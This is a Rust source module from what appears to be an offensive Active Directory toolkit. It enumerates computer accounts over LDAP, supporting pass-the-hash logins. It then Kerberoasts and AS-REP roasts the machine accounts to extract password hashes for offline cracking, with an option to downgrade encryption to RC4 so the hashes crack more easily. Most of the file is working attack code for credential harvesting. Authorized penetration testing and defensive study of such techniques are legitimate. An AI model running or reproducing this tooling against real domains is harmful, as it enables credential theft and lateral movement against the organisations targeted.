//! Machine$ account password harvesting.
//!
//! Computer accounts in Active Directory have passwords that rotate automatically
//! (default: every 30 days). These accounts often have:
//! - SPNs registered (making them kerberoastable)
//! - Higher privileges than regular users
//! - Weaker passwords (auto-generated, sometimes predictable)
//!
//! This module specifically targets machine accounts ($ suffix) for:
//! - Kerberoasting (extract TGS for offline cracking)
//! - AS-REP roasting (if pre-auth is disabled)
//! - Password analysis and harvesting

use crate::kerberoast::{self, KerberoastConfig, RoastedService};
use crate::asreproast::{self, AsRepRoastConfig, RoastedAccount};
use crate::runner::HuntConfig;
use colored::Colorize;
use overthrone_core::error::Result;
use overthrone_core::proto::ldap;
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use tracing::{info, warn};

// ═══════════════════════════════════════════════════════════
// Result Structures
// ═══════════════════════════════════════════════════════════

/// Machine account harvesting result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MachineHarvestResult {
    /// Machine accounts found with SPNs (kerberoastable)
    pub kerberoastable_machines: Vec<MachineAccount>,
    /// Machine accounts without pre-auth (AS-REP roastable)
    pub asrep_roastable_machines: Vec<MachineAccount>,
    /// Successfully roasted kerberos hashes
    pub kerberoast_results: Vec<RoastedService>,
    /// Successfully roasted AS-REP hashes
    pub asrep_results: Vec<RoastedAccount>,
    /// Summary statistics
    pub summary: HarvestSummary,
}

/// Machine account details
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MachineAccount {
    /// Machine account name (e.g., "WORKSTATION01$")
    pub sam_account_name: String,
    /// Distinguished name
    pub distinguished_name: String,
    /// DNS hostname
    pub dns_hostname: Option<String>,
    /// Operating system
    pub operating_system: Option<String>,
    /// SPNs registered to this machine
    pub spns: Vec<String>,
    /// Whether pre-auth is disabled
    pub preauth_disabled: bool,
    /// Account enabled status
    pub enabled: bool,
    /// Password last set date
    pub password_last_set: Option<String>,
}

/// Harvest summary statistics
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HarvestSummary {
    /// Total machine accounts enumerated
    pub total_machines: usize,
    /// Machines with SPNs (kerberoastable)
    pub kerberoastable_count: usize,
    /// Machines without pre-auth (AS-REP roastable)
    pub asrep_roastable_count: usize,
    /// Successfully extracted kerberos hashes
    pub kerberoast_success: usize,
    /// Successfully extracted AS-REP hashes
    pub asrep_success: usize,
    /// Total hashes harvested
    pub total_hashes: usize,
}

// ═══════════════════════════════════════════════════════════
// Configuration
// ═══════════════════════════════════════════════════════════

/// Configuration for machine account harvesting
#[derive(Debug, Clone)]
pub struct MachineHarvestConfig {
    /// Perform kerberoasting on machine accounts
    pub run_kerberoast: bool,
    /// Perform AS-REP roasting on machine accounts
    pub run_asrep: bool,
    /// Only target enabled accounts
    pub enabled_only: bool,
    /// Filter by OS pattern (e.g., "Windows Server", "Windows 10")
    pub os_filter: Option<String>,
    /// Output file for harvested hashes
    pub output_file: Option<PathBuf>,
    /// Downgrade to RC4 for easier cracking
    pub downgrade_to_rc4: bool,
}

impl Default for MachineHarvestConfig {
    fn default() -> Self {
        Self {
            run_kerberoast: true,
            run_asrep: true,
            enabled_only: true,
            os_filter: None,
            output_file: None,
            downgrade_to_rc4: false,
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Public API
// ═══════════════════════════════════════════════════════════

/// Harvest machine$ account passwords via kerberoasting and AS-REP roasting
///
/// This function:
/// 1. Enumerates all computer accounts (sAMAccountName ending with $)
/// 2. Identifies which have SPNs (kerberoastable)
/// 3. Identifies which have pre-auth disabled (AS-REP roastable)
/// 4. Optionally performs the actual roasting to extract hashes
/// 5. Returns harvest results ready for cracking
pub async fn harvest_machine_accounts(
    hunt_config: &HuntConfig,
    machine_config: &MachineHarvestConfig,
) -> Result<MachineHarvestResult> {
    info!(
        "{}",
        "═══ MACHINE ACCOUNT HARVESTING ═══".bold().bright_yellow()
    );

    let mut result = MachineHarvestResult {
        kerberoastable_machines: Vec::new(),
        asrep_roastable_machines: Vec::new(),
        kerberoast_results: Vec::new(),
        asrep_results: Vec::new(),
        summary: HarvestSummary {
            total_machines: 0,
            kerberoastable_count: 0,
            asrep_roastable_count: 0,
            kerberoast_success: 0,
            asrep_success: 0,
            total_hashes: 0,
        },
    };

    // Step 1: Enumerate machine accounts
    info!("Step 1/4: Enumerating machine accounts...");
    let machines = enumerate_machine_accounts(hunt_config, machine_config).await?;
    result.summary.total_machines = machines.len();
    info!("  Found {} machine accounts", machines.len());

    // Step 2: Classify machines by attack vector
    info!("Step 2/4: Classifying attack vectors...");
    for machine in &machines {
        if !machine.spns.is_empty() {
            result.kerberoastable_machines.push(machine.clone());
        }
        if machine.preauth_disabled {
            result.asrep_roastable_machines.push(machine.clone());
        }
    }

    result.summary.kerberoastable_count = result.kerberoastable_machines.len();
    result.summary.asrep_roastable_count = result.asrep_roastable_machines.len();

    info!(
        "  Kerberoastable: {} | AS-REP roastable: {}",
        result.kerberoastable_machines.len(),
        result.asrep_roastable_machines.len()
    );

    // Step 3: Kerberoast machine accounts
    if machine_config.run_kerberoast && !result.kerberoastable_machines.is_empty() {
        info!("Step 3/4: Kerberoasting {} machine accounts...", result.kerberoastable_machines.len());
        
        let kerb_config = KerberoastConfig {
            skip_machine_accounts: false, // We WANT machine accounts
            downgrade_to_rc4: machine_config.downgrade_to_rc4,
            output_file: machine_config.output_file.clone(),
            ..Default::default()
        };

        match kerberoast::run(hunt_config, &kerb_config).await {
            Ok(kerb_result) => {
                // Filter to only machine accounts
                let machine_hashes: Vec<RoastedService> = kerb_result.hashes
                    .into_iter()
                    .filter(|h| h.username.ends_with('$'))
                    .collect();

                result.summary.kerberoast_success = machine_hashes.len();
                result.kerberoast_results = machine_hashes;
                
                info!(
                    "  ✓ Extracted {} machine account hashes",
                    result.kerberoast_results.len()
                );
            }
            Err(e) => {
                warn!("  Kerberoasting failed: {}", e);
            }
        }
    }

    // Step 4: AS-REP roast machine accounts
    if machine_config.run_asrep && !result.asrep_roastable_machines.is_empty() {
        info!("Step 4/4: AS-REP roasting {} machine accounts...", result.asrep_roastable_machines.len());
        
        let asrep_config = AsRepRoastConfig {
            output_file: machine_config.output_file.clone(),
            ..Default::default()
        };

        match asreproast::run(hunt_config, &asrep_config).await {
            Ok(asrep_result) => {
                // Filter to only machine accounts
                let machine_hashes: Vec<RoastedAccount> = asrep_result.hashes
                    .into_iter()
                    .filter(|h| h.username.ends_with('$'))
                    .collect();

                result.summary.asrep_success = machine_hashes.len();
                result.asrep_results = machine_hashes;
                
                info!(
                    "  ✓ Extracted {} AS-REP machine hashes",
                    result.asrep_results.len()
                );
            }
            Err(e) => {
                warn!("  AS-REP roasting failed: {}", e);
            }
        }
    }

    // Calculate total
    result.summary.total_hashes = result.summary.kerberoast_success + result.summary.asrep_success;

    info!(
        "Harvest complete: {} total machine hashes extracted",
        result.summary.total_hashes
    );

    Ok(result)
}

// ═══════════════════════════════════════════════════════════
// Machine Account Enumeration
// ═══════════════════════════════════════════════════════════

async fn enumerate_machine_accounts(
    hunt_config: &HuntConfig,
    machine_config: &MachineHarvestConfig,
) -> Result<Vec<MachineAccount>> {
    info!("  LDAP: Enumerating computer accounts...");

    let mut conn = if hunt_config.use_hash {
        ldap::LdapSession::connect_with_hash(
            &hunt_config.dc_ip,
            &hunt_config.domain,
            &hunt_config.username,
            &hunt_config.secret,
            hunt_config.use_ldaps,
        )
        .await?
    } else {
        ldap::LdapSession::connect(
            &hunt_config.dc_ip,
            &hunt_config.domain,
            &hunt_config.username,
            &hunt_config.secret,
            hunt_config.use_ldaps,
        )
        .await?
    };

    // Get all computer accounts
    let computers = conn.enumerate_computers().await?;

    let mut machines = Vec::new();

    for computer in &computers {
        // Filter by enabled status (check UAC flag)
        const UAC_ACCOUNT_DISABLE: u32 = 0x00000002;
        let is_enabled = (computer.user_account_control & UAC_ACCOUNT_DISABLE) == 0;
        
        if machine_config.enabled_only && !is_enabled {
            continue;
        }

        // Filter by OS pattern
        if let Some(os_filter) = &machine_config.os_filter {
            if let Some(os) = &computer.operating_system {
                let os_lower: String = os.to_lowercase();
                let filter_lower: String = os_filter.to_lowercase();
                if !os_lower.contains(&filter_lower) {
                    continue;
                }
            } else {
                continue;
            }
        }

        // Check if pre-auth is disabled (rare for machines, but possible)
        const UAC_DONT_REQ_PREAUTH: u32 = 0x00400000;
        let preauth_disabled = (computer.user_account_control & UAC_DONT_REQ_PREAUTH) != 0;

        machines.push(MachineAccount {
            sam_account_name: computer.sam_account_name.clone(),
            distinguished_name: computer.distinguished_name.clone(),
            dns_hostname: computer.dns_hostname.clone(),
            operating_system: computer.operating_system.clone(),
            spns: computer.service_principal_names.clone(),
            preauth_disabled,
            enabled: is_enabled,
            password_last_set: None, // Not available in AdComputer struct
        });
    }

    info!("  Enumerated {} machine accounts (after filters)", machines.len());

    Ok(machines)
}
